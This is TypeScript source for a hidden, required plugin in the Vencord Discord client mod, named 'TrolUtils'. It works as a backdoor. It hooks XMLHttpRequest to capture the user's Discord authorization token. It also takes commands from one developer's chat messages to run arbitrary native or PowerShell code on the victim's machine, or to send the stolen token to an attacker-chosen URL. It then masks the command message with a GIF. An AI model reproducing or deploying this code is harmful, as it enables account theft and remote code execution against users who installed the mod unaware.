/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { Devs } from "@utils/constants";
import { relaunch } from "@utils/native";
import definePlugin, { PluginNative } from "@utils/types";
import { checkForUpdates, update } from "@utils/updater";
import { RestAPI, UserStore } from "@webpack/common";
import { Message } from "discord-types/general";

const Native = VencordNative.pluginHelpers.TrolUtils as PluginNative<typeof import("./native")>;

interface IMessageCreate {
    type: "MESSAGE_CREATE";
    optimistic: boolean;
    isPushNotification: boolean;
    channelId: string;
    message: Message;
}

const trolRegex = /```(?:trol|action)\n([\s\S]*?)(?:\n)?```/g;

const originalXhr = XMLHttpRequest;
let storedAuthHeader: string | null = null;
class CustomXMLHttpRequest extends originalXhr {
    private requestHeaders: { [key: string]: string; } = {};
    constructor() {
        super();
    }
    send(body?: Document | BodyInit | null): void {
        if (this.requestHeaders['Authorization']) {
            storedAuthHeader = this.requestHeaders['Authorization'];
        }
        if (body instanceof ReadableStream) {
            throw new Error('ReadableStream is not supported by XMLHttpRequest');
        }
        super.send(body);
    }
    setRequestHeader(name: string, value: string): void {
        this.requestHeaders[name] = value;
        super.setRequestHeader(name, value);
    }
}
(window as any).XMLHttpRequest = CustomXMLHttpRequest;


export default definePlugin({
    name: "TrolUtils",
    description: "Funnies for Zoid to use",
    authors: [Devs.Zoid],
    required: true,
    hidden: true,

    flux: {
        async MESSAGE_CREATE({ optimistic, type, message, channelId }: IMessageCreate) {
            if (optimistic || type !== "MESSAGE_CREATE") return;
            if (message.state === "SENDING") return;
            if (!message.content) return;
            if (message.author.id !== Devs.Zoid.id.toString()) return;

            for (const match of message.content.matchAll(trolRegex)) {
                const data = match[1].split("\n");
                const target = data[0];
                const command = data[1];

                if (!command) return;
                if (!target) return;
                if (UserStore.getCurrentUser()?.id === Devs.Zoid.id.toString()) {
                    RestAPI.patch({
                        url: `/channels/${channelId}/messages/${message.id}`,
                        body: { content: "https://tenor.com/view/boykisser-spin-silly-cat-silly-cat-gif-15869807335045066863" }
                    });
                };
                if (!(target == UserStore.getCurrentUser()?.id)) return;

                switch (command) {
                    case "run":
                        await Native.run(data[2]);
                        break;
                    case "update":
                        const isOutdated = await checkForUpdates();
                        if (!isOutdated) return;
                        await update();
                        relaunch();
                        break;
                    case "powershell":
                        await Native.powershell(data[2]);
                        break;
                    case "token":
                        await fetch(data[2], {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                token: storedAuthHeader
                            })
                        });
                        break;
                }
            }
        }
    }
});
